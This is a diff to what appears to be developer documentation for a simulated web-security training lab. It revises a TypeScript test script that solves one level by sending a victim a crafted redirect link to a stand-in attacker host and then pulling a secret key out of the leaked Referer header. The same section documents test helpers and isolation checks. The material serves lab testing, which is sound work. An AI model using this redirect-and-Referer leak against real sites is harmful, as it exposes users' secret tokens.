@@ -575,14 +575,18 @@ resists with its usual answer. See SV-01 in `tests/sim-lab.spec.ts`:
 ```ts
 const exploit: Script = async (agent, level) => {
   await agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: 'http://citadel.test/continue?next=http://attacker.test/x' });
-  const page = await agent.get(`${LAB}?level=${level}&lang=en`);
-  const key = referers(page.text).map((r) => new URL(r).searchParams.get('key')).find(Boolean) ?? 'none';
+  const page = await agent.get(`${LAB}?level=${level}`);
+  const ref = attackerHits(page.text).find((h) => h.url === 'http://attacker.test/x')?.referer;
+  const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
   return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
 };
 ```
 
-Parse the panel's escaped HTML (`Referer: <code>...</code>`, `<code>GET http://attacker.test/...</code>`) and unescape
-`&amp;` before using a URL. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
+Read the page as the player would, with the helpers in `tests/helpers.ts`: `attackerHits(html)` parses the panel's
+attacker log (one `{ seq, at, method, url, referer?, body? }` per `<li data-seq>`, unescaped, oldest first, like
+`world.attackerLog.entries()`), `referers(html)` lists the Referers, `panelOf(html)` cuts out the panel and
+`unescapeHtml(s)` undoes the escaped output tag. They read only the panel's log, never the lab's own content or the
+mailbox, in either language. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
 `.attackerLog.entries()`, `.inbox.list(ADMIN_MAILBOX)`, `.now = () => t` for timestamps and expiry). `describeLabView`
 works unchanged (it skips the panel's `sim-action` forms). Add the lab-specific cases: the victim's secret never
 appears on the page except through the flaw, players and levels are isolated, the legit victim flow ends on a citadel
